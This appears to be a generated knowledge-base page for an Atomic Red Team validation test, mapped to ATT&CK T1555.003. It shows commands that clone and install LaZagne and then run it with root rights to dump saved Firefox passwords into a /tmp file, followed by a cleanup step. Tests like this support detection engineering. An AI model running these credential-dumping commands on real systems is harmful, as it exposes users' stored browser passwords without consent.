---
atomic_guid: "87e88698-621b-4c45-8a89-4eaebdeaabb1"
title: "LaZagne.py - Dump Credentials from Firefox Browser"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.003"
attack_technique_name: "Credentials from Password Stores: Credentials from Web Browsers"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml"
build_date: "2026-04-27 19:12:28"
executor: "sh"
aliases:
  - "87e88698-621b-4c45-8a89-4eaebdeaabb1"
  - "LaZagne.py - Dump Credentials from Firefox Browser"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores#^t1555003-credentials-from-web-browsers|T1555.003: Credentials from Web Browsers]]

## Input Arguments

### lazagne_path

- description: Path you put LaZagne Github with LaZagne.py
- type: string
- default: /tmp/LaZagne/Linux

### output_file

- description: This is where output for the Firefox passwords goes
- type: string
- default: /tmp/firefox_password.txt

### specific_module

- description: You may change the module to "all" for all password that can be found by LaZagne.py
- type: string
- default: browsers -firefox

## Dependencies

Get Lazagne from Github and install requirements

### Prerequisite Check

```bash
test -f #{lazagne_path}/laZagne.py
```

### Get Prerequisite

```bash
cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
```

Needs git, python3 and some pip stuff

### Prerequisite Check

```bash
which git && which python3 && which pip
```

### Get Prerequisite

```bash
apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}
```

### Cleanup

```bash
rm -R /tmp/LaZagne; rm -f #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.yaml)
